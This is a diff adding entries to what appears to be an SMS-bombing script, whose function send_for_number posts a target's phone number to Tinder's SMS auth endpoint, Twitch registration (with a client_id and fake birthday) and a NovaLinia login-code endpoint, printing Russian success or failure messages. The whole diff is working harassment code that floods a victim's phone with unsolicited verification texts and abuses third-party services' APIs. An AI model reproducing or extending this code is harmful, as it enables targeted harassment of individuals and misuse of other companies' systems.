@@ -731,7 +731,32 @@ def send_for_number(phone):
             print('[+] Delivery отправлено!')
             time.sleep(0.1)
         except:
-            pass
+            print('[-] IVI Не отправлено!')
+
+        try:
+            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
+                          data={'phone_number': _phone})
+            print('[+] Tinder отправлено!')
+        except:
+            print('[-] Tinder Не отправлено!')
+
+        try:
+            requests.post('https://passport.twitch.tv/register?trusted_request=true',
+                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
+                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
+                                "password": password, "phone_number": _phone, "username": username})
+            print('[+] Twitch отправлено!')
+        except:
+            print('[-] Twitch Не отправлено!')
+
+        try:
+            requests.post('https://www.nl.ua',
+                          data={'component': 'bxmaker.authuserphone.login',
+                                'sessid': 'bf70db951f54b837748f69b75a61deb4',
+                                'method': 'sendCode', 'phone': _phone, 'registration': 'N'})
+            print('[+] NovaLinia отправлено!')
+        except:
+            print('[-] NovaLinia Не отправлено!')
 
 
 
